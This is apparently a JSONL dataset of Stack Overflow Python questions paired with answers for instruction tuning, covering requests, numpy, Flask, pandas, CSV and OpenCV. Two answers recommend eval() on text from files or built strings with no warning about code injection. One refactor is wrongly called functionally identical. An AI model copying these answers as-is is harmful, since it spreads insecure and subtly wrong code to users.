requests.post(api_endpoint, headers= payload, data=str(''' {&quot;requests&quot;:[{&quot;indexName&quot;:&quot;OmniSearch_sus_production&quot;,&quot;query&quot;:&quot;'''+search_keyword+'''&quot;,&quot;params&quot;:&quot;attributesToSnippet=%5B%22body%3A80%22%2C%22searchable_comments%3A30%22%5D&amp;page=0&amp;hitsPerPage=10&amp;filters=&amp;facetFilters=%5B%5B%5D%5D&amp;facets=%5B%22channel%22%5D&amp;sortFacetValuesBy=count&amp;clickAnalytics=true&quot;}]} ''')) \n\n    print(r)\n\nif __name__ == &quot;__main__&quot;:\n    get_data_from_api()\n<\/code><\/pre>","output_text":"<p>To follow up on my comment, there are a few places where you can let Python do the hard work for you. Consider this alternative that uses <code>urllib.parse.urlencode<\/code> to create the <code>params<\/code> value, then lets Requests serialize your data structure:<\/p>\n<pre><code>from urllib.parse import urlencode\n\nimport requests\n\n\ndef get_data_from_api():\n    search_keyword = &quot;money&quot;\n    api_endpoint = &quot;...&quot;\n    headers = {\n        &quot;x-xxxx-application-id&quot;: &quot;...&quot;,\n        &quot;x-xxx-api-key&quot;: &quot;...&quot;,\n    }\n\n    params = {\n        &quot;attributesToSnippet&quot;: '[&quot;body:80&quot;,&quot;searchable_comments:30&quot;]',\n        &quot;page&quot;: &quot;0&quot;,\n        &quot;hitsPerPage&quot;: &quot;10&quot;,\n        &quot;facetFilters&quot;: &quot;[[]]&quot;,\n        &quot;filters&quot;: &quot;&quot;,\n        &quot;facets&quot;: '[&quot;channel&quot;]',\n        &quot;sortFacetValuesBy&quot;: &quot;count&quot;,\n        &quot;clickAnalytics&quot;: &quot;true&quot;,\n    }\n\n    r = requests.post(\n        api_endpoint,\n        headers=headers,\n        data={\n            &quot;requests&quot;: [\n                {\n                    &quot;indexName&quot;: &quot;OmniSearch_sus_production&quot;,\n                    &quot;query&quot;: search_keyword,\n                    &quot;params&quot;: urlencode(params),\n                }\n            ]\n        },\n    )\n\n    return r.json()\n<\/code><\/pre>\n<p>Quick, ApplePie! It's 2AM and something broke and everyone's in a panic! Which version of the code (which is functionally identical) would you rather have to troubleshoot?<\/p>\n<p>I know this doesn't directly answer your question, but take this in the spirit of &quot;while we're on the subject...&quot;.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Match the elements of a vector and a matrix, returning a new matrix<p>I have the following numpy arrays:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>[\n  [96.6074, 73.3443, 37.2574],\n  [11.2753, 39.8242, 42.1898],\n  [46.5815, 76.2492, 71.7398],\n  [4.99222, 7.64707, 6.5171],\n]\n<\/code><\/pre>\n<pre class=\"lang-py prettyprint-override\"><code>[\n  True,\n  False,\n  False,\n  True\n]\n<\/code><\/pre>\n<p>Now I want the elements of the boolean array to correspond to the rows of the float array.\nI want to &quot;match&quot; them and create 2 new arrays, where:<\/p>\n<ul>\n<li><code>arr1<\/code> will contain only the rows of floatArray where the same rows (by index) in boolArray had <strong><code>True<\/code><\/strong><\/li>\n<li><code>arr2<\/code> will contain only the rows of floatArray where the same rows (by index) in boolArray had <strong><code>False<\/code><\/strong><\/li>\n<\/ul>\n<p>I'm think it can be done with a loop like this:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>arr1 = np.array([])\narr2 = np.array([])\n\nfor idx, element in  np.ndenumerate(boolArray):\n    if (element == True):\n        # append floatArray[idx] to arr1\n    else:\n        # append floatArray[idx] to arr2\n<\/code><\/pre>\n<p>But I'm new to python and I'm not really sure how to do it.. Any ideas?<\/p>","output_text":"<p>You can simply use array masking:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>&gt;&gt;&gt; arr = np.array([\n        [96.6074, 73.3443, 37.2574],\n        [11.2753, 39.8242, 42.1898],\n        [46.5815, 76.2492, 71.7398],\n        [4.99222, 7.64707, 6.5171],\n    ])\n&gt;&gt;&gt; mask = np.array([True, False, False, True])\n&gt;&gt;&gt; arr[mask]\narray([[96.6074 , 73.3443 , 37.2574 ],\n       [ 4.99222,  7.64707,  6.5171 ]])\n&gt;&gt;&gt; arr[~mask]\narray([[11.2753, 39.8242, 42.1898],\n       [46.5815, 76.2492, 71.7398]])\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Heroku defaults to 127.0.0.01 on page change<p>I'm having some trouble deploying my Flask App to Heroku. After a few tutorials I managed to get my Flask App hosted on Heroku, but I can't access any other pages. It reaches the homepage on <a href=\"https:\/\/todoapplication-464425.herokuapp.com\/\" rel=\"nofollow noreferrer\">https:\/\/todoapplication-464425.herokuapp.com\/<\/a>, but when I try and change to the Login\/Register\/Logout then it just defaults back to 127.0.0.1:5000. Does anyone know a workaround for this?<\/p>\n<p>Procfile<\/p>\n<pre><code>web: gunicorn App:app\n<\/code><\/pre>\n<p>Requirements.txt<\/p>\n<pre><code>Flask==1.0.2\nFlask-SQLAlchemy==2.5.\ngunicorn==20.1.0\nJinja2==2.11.3\nMarkupSafe==1.1.1\nSQLAlchemy==1.4.15\nvirtualenv==20.4.6\nWerkzeug==1.0.1\n<\/code><\/pre>\n<p><a href=\"https:\/\/i.imgur.com\/KrFeUzf.png\" rel=\"nofollow noreferrer\">Folder setup<\/a><\/p>\n<p>templates:<\/p>\n<pre><code>base.html\nindex.html\nlogin.html\nregister.html\ntodolist.html\n<\/code><\/pre>\n<p>login.html:<\/p>\n<pre><code>{% extends &quot;base.html&quot; %}\n{% block title %} Login Page {% endblock %}\n\n{% block content %}\n\n    {% with messages = get_flashed_messages() %}\n        {% if messages %}\n            {% for msg in messages %}\n                &lt;p&gt;{{msg}}&lt;\/p&gt;\n            {% endfor %}\n        {% endif %}\n    {% endwith %}\n\n&lt;form action=&quot;{{ url_for('login')}}&quot; method=&quot;post&quot;&gt;\n    &lt;p&gt;Email: &lt;\/p&gt;\n    &lt;p&gt;&lt;input type=&quot;email&quot; name=&quot;email&quot; \/&gt;&lt;\/p&gt;\n\n    &lt;p&gt;Password: &lt;\/p&gt;\n    &lt;p&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; \/&gt;&lt;\/p&gt;\n\n    &lt;p&gt;&lt;input type=&quot;submit&quot; value =&quot;submit&quot; \/&gt;&lt;\/p&gt;\n&lt;\/form&gt;\n{% endblock %}\n<\/code><\/pre>\n<p>Base.html<\/p>\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=&quot;en&quot;&gt;\n&lt;head&gt;\n    &lt;link rel=&quot;stylesheet&quot; href=&quot;https:\/\/stackpath.bootstrapcdn.com\/bootstrap\/4.3.1\/css\/bootstrap.min.css&quot; \n    integrity=&quot;sha384-ggOyR0iXCbMQv3Xipma34MD+dH\/1fQ784\/j6cY\/iJTQUOhcWr7x9JvoRxT2MZw1T&quot; crossorigin=&quot;anonymous&quot;&gt;\n    &lt;link rel=&quot;stylesheet&quot; type=&quot;text\/css&quot; href=&quot;{{ url_for('static', filename='style.css')}}&quot;&gt;\n    &lt;meta charset=&quot;UTF-8&quot;&gt;\n    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;\n    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;\n    &lt;title&gt;&lt;\/title&gt;\n&lt;\/head&gt;\n&lt;body&gt;\n    &lt;nav class=&quot;navbar navbar-dark bg-dark&quot;&gt;\n        &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;ToDo App&lt;\/a&gt;\n        &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbarNavAltMarkup&quot; aria-controls=&quot;navbarNavAltMarkup&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;\n          &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;\/span&gt;\n        &lt;\/button&gt;\n        &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarNavAltMarkup&quot;&gt;\n          &lt;div class=&quot;navbar-nav&quot;&gt;\n            &lt;a class=&quot;nav-item nav-link active&quot; href=&quot;http:\/\/127.0.0.1:5000\/&quot;&gt;Home &lt;span class=&quot;sr-only&quot;&gt;(current)&lt;\/span&gt;&lt;\/a&gt;\n            &lt;a class=&quot;nav-item nav-link&quot; href=&quot;http:\/\/127.0.0.1:5000\/login&quot;&gt;Login&lt;\/a&gt;\n            &lt;a class=&quot;nav-item nav-link&quot; href=&quot;http:\/\/127.0.0.1:5000\/register&quot;&gt;Register&lt;\/a&gt;\n            &lt;a class=&quot;nav-item nav-link&quot; href=&quot;http:\/\/127.0.0.1:5000\/logout&quot;&gt;Logout&lt;\/a&gt;\n          &lt;\/div&gt;\n        &lt;\/div&gt;\n      &lt;\/nav&gt;\n    {% block content %}\n    \n    \n    \n    \n    {% endblock %}\n&lt;script src=&quot;https:\/\/code.jquery.com\/jquery-3.3.1.slim.min.js&quot; integrity=&quot;sha384-q8i\/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo&quot; \ncrossorigin=&quot;anonymous&quot;&gt;&lt;\/script&gt;\n&lt;script src=&quot;https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/popper.js\/1.14.7\/umd\/popper.min.js&quot; integrity=&quot;sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1&quot; \ncrossorigin=&quot;anonymous&quot;&gt;&lt;\/script&gt;\n&lt;script src=&quot;https:\/\/stackpath.bootstrapcdn.com\/bootstrap\/4.3.1\/js\/bootstrap.min.js&quot; integrity=&quot;sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf\/nJGzIxFDsf4x0xIM+B07jRM&quot; \ncrossorigin=&quot;anonymous&quot;&gt;&lt;\/script&gt;\n&lt;\/body&gt;\n&lt;\/html&gt;\n\n&lt;!--All scripts for the NavBar have been added from https:\/\/getbootstrap.com\/docs\/4.3\/getting-started\/introduction\/.\n    Navbar and CSS code taken from https:\/\/getbootstrap.com\/docs\/4.3\/components\/navbar\/ and then edited\/customised. --&gt;\n<\/code><\/pre>","output_text":"<p>Alright, error on my part: the base.html was still using hardcoded addresses, such as:<\/p>\n<pre><code>&lt;a class=&quot;nav-item nav-link&quot; href=&quot;http:\/\/127.0.0.1:5000\/login&quot;&gt;Login&lt;\/a&gt;\n<\/code><\/pre>\n<p>Silly oversight! Thank you everyone<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to annotate function result based on argument attribute<p>Lets suppose i have the following types<\/p>\n<pre><code>import typing\n\nclass A:\n  pass\n\nclass B:\n  @property\n  def a_factory(self): -&gt; typing.Type[A]\n    return A\n<\/code><\/pre>\n<p>my problem is howto define a type for a callable that takes B instance as argument and return an instance of\nthe <code>a_factory<\/code> attribute.<\/p>\n<p>What i have so far:<\/p>\n<pre><code>C = typing.Callable[[B], ?]\n<\/code><\/pre>\n<p>I don't want to use A directly because i want the C type to convey the requirement of using B.a_factory factory to produce the return value.\nAny ideas?<\/p>","output_text":"<pre class=\"lang-py prettyprint-override\"><code>import typing\n\nclass A:\n    pass\n\nclass B:\n    @property\n    def a_factory(self) -&gt; typing.Type[A]:\n        return A\n\nb = B()  # an instance of class B\n\nC = typing.get_type_hints(B.a_factory.fget)[&quot;return&quot;]\nC = typing.get_type_hints(b.__class__.a_factory.fget)[&quot;return&quot;]\nprint(C)  # typing.Type[__main__.A]\n<\/code><\/pre>\n<ul>\n<li>Maybe a property is not simply a callable; since the code above only defines getter of property, so we need <code>fget<\/code> to retrive the getter function, then use <code>get_type_hints<\/code> to get returned type.<\/li>\n<li>To retrive the class <code>B<\/code> from instance <code>b<\/code>, we need <code>__class__<\/code> attribute.<\/li>\n<\/ul>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Trying to use LabelEncoder and OneHotEncoder into a Dataset with Multiple Columns<p>I'm trying to convert multiple columns which there are a bunch of data in categorical values; but i getting a error when i goes to use OneHotEncoder<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/slWZg.png\" rel=\"nofollow noreferrer\">My Dataframe<\/a><\/p>\n<p><strong>1) Separating the columns in X_census and Y_census<\/strong> (X_census contains categorical values):<\/p>\n<pre><code>X_census  = df[['workclass',\n               'education',\n               'marital-status',\n               'occupation',\n               'relationship',\n               'race',\n               'sex',\n               'native-country']]\n\nY_census = df['income']\n<\/code><\/pre>\n<p><strong>2) Treating categorical values from X_census with LabelEncoder<\/strong>:<\/p>\n<p>from sklearn.preprocessing import LabelEncoder<\/p>\n<pre><code>le = LabelEncoder()\nX_1 = X_census.apply(le.fit_transform)\nX_2 = X_1.to_numpy()\n<\/code><\/pre>\n<p><strong>3) Now using OneHotEncoder into my X_2 to convert categorical to numerical values<\/strong>:<\/p>\n<pre><code>from sklearn.preprocessing import OneHotEncoder\nfrom sklearn.compose import ColumnTransformer\n\noh = OneHotEncoder()\nonehotencoder_census = ColumnTransformer(transformers=[('OneHot', oh, X_2[:])],remainder='passthrough')\nX_census = onehotencoder_census.fit_transform(X_census) # Error appears here!\n<\/code><\/pre>\n<p><a href=\"https:\/\/i.stack.imgur.com\/uDi6O.png\" rel=\"nofollow noreferrer\">The Error<\/a><\/p>","output_text":"<h2>you can use pandas.get_dummies<\/h2>\n<blockquote>\n<blockquote>\n<p>df = pd.DataFrame({&quot;marital_status&quot;:['S','M','D','S','M','D','S','M','D'],\n&quot;sex&quot;:[&quot;male&quot;,&quot;female&quot;,&quot;male&quot;,&quot;female&quot;,&quot;male&quot;,&quot;female&quot;,&quot;male&quot;,&quot;female&quot;,&quot;male&quot;],\n&quot;education&quot;:['grad','post-grad','grad','post-grad','grad','post-grad','grad','post-grad','grad'],\n&quot;income&quot;:[125,135,120,110,90,150,180,130,110]})<\/p>\n<\/blockquote>\n<\/blockquote>\n<p><a href=\"https:\/\/i.stack.imgur.com\/MS3tQ.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/MS3tQ.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<blockquote>\n<blockquote>\n<p>pd.get_dummies(df)<\/p>\n<\/blockquote>\n<\/blockquote>\n<p><a href=\"https:\/\/i.stack.imgur.com\/C3jMN.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/C3jMN.png\" alt=\"enter image description here\" \/><\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n CSV module to concatenate fields<p>I am trying to concatenate some fields in 2 csv files. Normally this task is easily done in Excel using index match, however, I would like to do it in Python.<\/p>\n<p>CSV A (has 3 columns)<\/p>\n<pre><code>ID, Age, FirstName\n1,   18,   Lia\n2,   18,   Joe\n2,   18,   John\n<\/code><\/pre>\n<p>CSV B (has 3 columns)<\/p>\n<pre><code>ID, Gender, \n1,    Female,  \n2,    Male,    \n<\/code><\/pre>\n<p>CSV C (I want to create this)<\/p>\n<pre><code>ID, Age, FirstName, Gender\n1,   18,   Lia,     Female\n2,   18,   Joe,     Male\n2,   18,   John,    Male\n<\/code><\/pre>\n<p>How can I achieve this using Python's csv module?<\/p>","output_text":"<p>When specifying that the solution must be done using the <a href=\"https:\/\/docs.python.org\/3\/library\/csv.html\" rel=\"nofollow noreferrer\">built in CSV module<\/a> or a specific tool, you should consider why.<\/p>\n<p>From the docs:<\/p>\n<blockquote>\n<p>The csv module implements classes to read and write tabular data in CSV format...<br \/>\nThe csv module\u2019s reader and writer objects read and write sequences. Programmers can also read and write data in dictionary form using the DictReader and DictWriter classes.<\/p>\n<\/blockquote>\n<p>This doesn't sound like this fits in with this use case of merging CSVs.<br \/>\nIf this is done to familiarise yourself with the csv module alone, then consider choosing another use case to work on.<\/p>\n<hr \/>\n<p>To elaborate on this point and answer the question with the specified criteria, I have done it in two ways:<\/p>\n<ol>\n<li>Forced solution using CSV module<\/li>\n<\/ol>\n<p>Assuming CSV A -&gt; one.csv and CSV B -&gt; two.csv and CSV C -&gt; out.csv<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>import csv\n\ndef get_csv_lines(filename):\n    &quot;&quot;&quot;Read csv using csv.DictReader and return \n    the lines as a list of dictionaries.&quot;&quot;&quot;\n    lines = []\n    with open(filename, newline='') as csvfile:\n        csv_reader = csv.DictReader(csvfile)\n        for row in csv_reader:\n            lines.append(row)\n    return lines\n\ndef write_csv_lines(filename, lines):\n    &quot;&quot;&quot;Take a list of dictionaries and write to CSV file.\n    Keys are headers, values are row values.&quot;&quot;&quot;\n    with open(filename, mode='w', newline='') as csv_file:\n        fieldnames = lines[0].keys()\n        writer = csv.DictWriter(csv_file, fieldnames=fieldnames)\n        writer.writeheader()\n        for line in lines:\n            writer.writerow(line)\n\nif __name__ == '__main__':\n    l1 = get_csv_lines('one.csv')\n    l2 = get_csv_lines('two.csv')\n    l3 = []\n    for num, dic1 in enumerate(l1):  # foreign key first\n        l3.append(dic1)\n        for dic2 in l2:  # primary key second\n            if dic1['ID'] == dic2['ID']:\n                l3[num].update(dic2)  # cannot guarantee order so would have to do some more trickery if needed\n    write_csv_lines('out.csv', l3)\n<\/code><\/pre>\n<p>This is also based on this specific use case where one csv has a foreign key of ID and the other csv has a primary key of ID.<\/p>\n<ol start=\"2\">\n<li>The ease of Pandas library<\/li>\n<\/ol>\n<pre class=\"lang-py prettyprint-override\"><code>import pandas as pd\n\ndf1 = pd.read_csv('one.csv')\ndf2 = pd.read_csv('two.csv')\ndf3 = pd.merge(left=df1, right=df2, how='inner', on='ID')\ndf3.to_csv('out.csv', index=False)\n<\/code><\/pre>\n<p>Exactly the use case Pandas merge method was built for.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to apply gradient\/magnitude to an image using OpenCV?<p>I'm currently following <a href=\"https:\/\/towardsdatascience.com\/canny-edge-detection-step-by-step-in-python-computer-vision-b49c3a2d8123\" rel=\"nofollow noreferrer\">this tutorial<\/a> as part of an university assignment where we are supposed to implement canny edge detection ourselfes. Applying the gaussian blur worked without any problems but now I'm trying to display the magnitude intensity as shown on the website.<\/p>\n<p>I implemented the functions as seen on the mentioned website and created a function for running the canny edge detection. Currently this is what the function looks like:<\/p>\n<pre><code>def canny_edge(img):\n    noise_reduction = cv.filter2D(img, -1, gaussian_kernel(5))\n    cv.imshow('Blur', noise_reduction)\n    magnitude, gradient = sobel_filters(img)\n    magnitude = magnitude.astype(np.uint8)\n    sobel = magnitude * gradient\n    sobel = sobel.astype(np.uint8)\n    test = img + (255 - gradient * noise_reduction)\n    plt.imshow(gradient, cmap='gray')\n    plt.show()\n    cv.imshow('Gradient', magnitude)\n    cv.imshow('Original Image', img)\n<\/code><\/pre>\n<p>I had to convert the magnitude and sobel arrays to <code>np.uint8<\/code> as otherwise they'd contain <code>float<\/code> values which led to an error when displaying the image. Currently, I'm using the variable <code>test<\/code> to try various things, like <code>gradient - noise_reduction<\/code>, the line you see above, etc. The problem is that I always get images that look similar to these (image on the left shows <code>test<\/code>, image on the right shows <code>gradient<\/code>, image at the bottom shows <code>magnitude<\/code>):<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/l0yLo.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/l0yLo.png\" alt=\"enter image description here\" \/><\/a>\n<a href=\"https:\/\/i.stack.imgur.com\/Swxh3.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/Swxh3.png\" alt=\"enter image description here\" \/><\/a>\n<a href=\"https:\/\/i.stack.imgur.com\/CbXt1.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/CbXt1.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>I'm not too familiar with all the OpenCV functions that are available but I guess perhaps it might be important to use some of them that I don't know for this purpose. Unfortunately I haven't been able to find any information about how the magnitude returned by the <code>sobel_filters<\/code> function is applied to the image in the tutorial linked above. Thanks in advance for any input on how to solve this problem.<\/p>","output_text":"<p>I think there might be an issue with ndimage.filters.convolve. I got similar results as you. But the following seems to work fine using Python\/OpenCV<\/p>\n<p>Input:<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/Ki6UD.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/Ki6UD.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<pre><code>import cv2\nimport numpy as np\nimport skimage.exposure\n\nimg = cv2.imread('black_dress.png', cv2.IMREAD_GRAYSCALE)\n\nimg = cv2.GaussianBlur(img, (0,0), sigmaX=1.5, sigmaY=1.5)\n\nKx = np.array([[-1, 0, 1], \n               [-2, 0, 2], \n               [-1, 0, 1]])\nKy = np.array([[1,   2,  1], \n               [0,   0,  0], \n              [-1,  -2, -1]])\n\nIx = cv2.filter2D(img, -1, Kx)\nIy = cv2.filter2D(img, -1, Ky)\n\nG = np.hypot(Ix, Iy)\nG = skimage.exposure.rescale_intensity(G, in_range='image', out_range=(0,255)).astype(np.uint8)\n\ntheta = np.arctan2(Iy, Ix)\ntheta = skimage.exposure.rescale_intensity(theta, in_range='image', out_range=(0,255)).astype(np.uint8)\n   \ncv2.imwrite('black_dress_gradient_magnitude.png', G)\ncv2.imwrite('black_dress_gradient_direction.png', theta)\n\ncv2.imshow(&quot;magnitude&quot;, G)\ncv2.imshow(&quot;direction&quot;, theta)\ncv2.waitKey(0)\n<\/code><\/pre>\n<p>Magnitude:<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/ikg6f.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/ikg6f.png\" alt=\"enter image description here\" \/><\/a><\/p>\n<p>Direction:<\/p>\n<p><a href=\"https:\/\/i.stack.imgur.com\/XrL5C.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/XrL5C.png\" alt=\"enter image description here\" \/><\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python : Rename duplicates in a list with progressive indexing by taking of possible overwritting<p>I need to indexing a list of string because I don't want duplicates to avoid the overwritting when I rename files.<\/p>\n<p>Let's say that I have a liste like this one :<\/p>\n<pre><code>list = ['name', 'city', 'city', 'name1', 'town', 'city2', 'town', 'name2']\n<\/code><\/pre>\n<p>And I would like to get a list like this one :<\/p>\n<pre><code>list = ['name3', 'city1', 'city3', 'name1', 'town1', 'city2', 'town2', 'name2']\n<\/code><\/pre>\n<p>To do that I was inspired by this post :<\/p>\n<p><a href=\"https:\/\/stackoverflow.com\/questions\/30650474\/python-rename-duplicates-in-list-with-progressive-numbers-without-sorting-list\">Python: Rename duplicates in list with progressive numbers without sorting list<\/a><\/p>\n<p>And I wrote this code that doesn't ! Can anyone find what it misses or tell me if it is completly wrong !<\/p>\n<pre><code>def unique(mylist):\nnewlist = []\n\nfor i, v in enumerate(mylist):\n    totalcount = mylist.count(v)\n    print('Step 1, totalcount : '+ str(totalcount))\n    count = mylist[:i].count(v)\n    print('Step 2, count : '+ str(count))\n\n    if totalcount &gt; 1 :\n        print('Logic test :' + str(bool((v + str(count + 1)) in mylist)))\n        while (v + str(count + 1)) in mylist :\n            count += 1 \n        list[i] = v + str(count+1)\n        \n    else : \n        list[i] = v\n\n    newlist.append(list[i])\n    print('Step 3 : '+str(newlist))\n\nreturn newlist\n<\/code><\/pre>\n<p>The result of my code is :<\/p>\n<pre><code>['name', 'city1', 'city', 'name1', 'town1', 'city2', 'town', 'name2']\n<\/code><\/pre>\n<p>Because I can find the code, I am thinking to apply a function that removes only the last digits of a string like the following function and then indexing with one of the codes present in the link. However, I would find more elegant to do it directly. What do you think ?<\/p>\n<pre><code>def delete_digit_end(string):\n\nname_parts=re.findall(r'[^\\d_]+|[^\\D]+|[^\\W_]+|[\\W_]+', string) # this part creates a list by splitting the digits,\n# letters and '-_'\n\nlenght=len(name_parts)-1 #we want to analize the last element of the list, if it contains digits or '_-'\n\n# We do a loop while to test if the parts have digits or '-_', if true we execute the loop until it is false \nwhile name_parts[lenght].isdigit() : \n    # if it is true it will remove them\n    name_parts[lenght]=''# it will remove them\n    lenght -= 1 # if the condition was true, we continue with one inferior part\n\nnew_string = ''.join(map(str,name_parts))# now that we have cleaned if it was necessary we concatenate them\n\nreturn new_string\n<\/code><\/pre>","output_text":"<p>Here is something you can work on :<\/p>\n<pre><code>l = ['name', 'city', 'city', 'name1', 'town', 'city2', 'town', 'name2']\n\nnew_list = []\n\nfor item in l:\n    i = 1\n    if item[-1].isnumeric():\n        new_list.append(item)\n    else:\n        while item + str(i) in l or item + str(i) in new_list:\n            i += 1\n        new_list.append(item + str(i))\n\nprint(new_list)\n<\/code><\/pre>\n<p>Output :<\/p>\n<pre><code>['name3', 'city1', 'city3', 'name1', 'town1', 'city2', 'town2', 'name2']\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to convert a string, with functions inside, into a executable code in Python?<p>I have a .txt file that has the following text:<\/p>\n<pre><code>&quot;np.sqrt(2)**2&quot;\n<\/code><\/pre>\n<p>I can't get the answer to this mathematical equation because is a string, does anyone know how to convert that text to code (In python)? So when executing the script I will have the following output:<\/p>\n<pre><code>[In] np.sqrt(2)**2\n[Out] 2\n<\/code><\/pre>","output_text":"<p>You can use the <code>eval()<\/code> method.\nThe return value is the result of the evaluated expression.<\/p>\n<pre><code>&gt;&gt;&gt; x = 1\n&gt;&gt;&gt; eval('x + 1')\n2\n&gt;&gt;&gt; eval('x')\n1\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Fetching dictionary key using list values<p>I have a dictionary where the value of the dictionary is in list. i know only one value of the list and wanted to fetch the key of that value.example:<\/p>\n<pre><code>mydict={&quot;java&quot;:[100,200,300], &quot;python&quot;:[500,600]}\n\nprint(list(mydict.keys())[list(mydict.values()).index([100])] #gives error as 100 is not the only element in the list \n<\/code><\/pre>\n<p>i know the value 100 and want to get the key of the 100 i.e. i want to print &quot;java&quot; by just using 100 value. is it possible to get the key just by knowing a single element of the list.<\/p>","output_text":"<p>Iterate over the key value pairs of the dictionary, and if your value is in the value (the list), return the key:<\/p>\n<pre><code>def findkey(d, value):\n    for k, v in d.items():\n        if value in v:\n            return k\n    return None # optional\n\n&gt;&gt;&gt; findkey(mydict, 100)\n'java'\n\n&gt;&gt;&gt; findkey(mydict, 42)\nNone\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Best way to parse this sequence?<p>I get a string like this<\/p>\n\n<pre><code>EXAMPLE{TEST;ANOTHER{PART1;PART2};UNLIMITED{POSSIBILITIES{LIKE;THIS}}}\n<\/code><\/pre>\n\n<p>and have to get a result like this <\/p>\n\n<pre><code>EXAMPLETEST\nEXAMPLEANOTHERPART1\nEXAMPLEANOTHERPART2\nEXAMPLEUNLIMITEDPOSSIBILITIESLIKE\nEXAMPLEUNLIMITEDPOSSIBILITIESTHIS\n<\/code><\/pre>\n\n<p>Because there could be a unlimited amount of nesting, I'm having troubles remembering the parts before. Could you maybe point me in the right direction ?<\/p>\n\n<p>Thanks a lot<\/p>","output_text":"<p>Goal: Turn it into a dict. And then create your output from the dictionary.<\/p>\n\n<pre><code>&gt;&gt;&gt; string = \"EXAMPLE{TEST;ANOTHER{PART1;PART2};UNLIMITED{POSSIBILITIES{LIKE;THIS}}}\"\n&gt;&gt;&gt; string = string.replace(\";\", \",\").replace(\"{\", \": {\")\n&gt;&gt;&gt; string\n'EXAMPLE: {TEST,ANOTHER: {PART1,PART2},UNLIMITED: {POSSIBILITIES: {LIKE,THIS}}}'\n<\/code><\/pre>\n\n<p><code>EXAMPLE<\/code>, <code>TEST<\/code>, <code>ANOTHER<\/code> are strings but they aren't wrapped in quotation marks <code>\"\"<\/code> or  <code>''<\/code>.<\/p>\n\n<p>Using RegEx to solve this problem:<\/p>\n\n<pre><code>&gt;&gt;&gt; import re\n&gt;&gt;&gt; string = re.sub(r\"(\\w+)\", r\"'\\1'\", string)\n&gt;&gt;&gt; string\n\"'EXAMPLE': {'TEST','ANOTHER': {'PART1','PART2'},'UNLIMITED': {'POSSIBILITIES': {'LIKE','THIS'}}}\"\n<\/code><\/pre>\n\n<p>This is still not a valid file format. It's not JSON. It's not a dict. It's a mixture of a dict and a set in Python.<br>\nMaking it look more like a dictionary:<\/p>\n\n<pre><code>&gt;&gt;&gt; string = re.sub(r\"'(\\w+)',\", r\"'\\1': None, \", string)\n&gt;&gt;&gt; string = re.sub(r\"'(\\w+)'}\", r\"'\\1': None}\", string)\n&gt;&gt;&gt; string\n\"'EXAMPLE': {'TEST': None, 'ANOTHER': {'PART1': None, 'PART2': None},'UNLIMITED': {'POSSIBILITIES': {'LIKE': None, 'THIS': None}}}\"\n<\/code><\/pre>\n\n<p>Now turning it into a Python object:<\/p>\n\n<pre><code>&gt;&gt;&gt; my_dict = eval('{' + string + '}')\n&gt;&gt;&gt; my_dict\n{'EXAMPLE': {'TEST': None, 'ANOTHER': {'PART1': None, 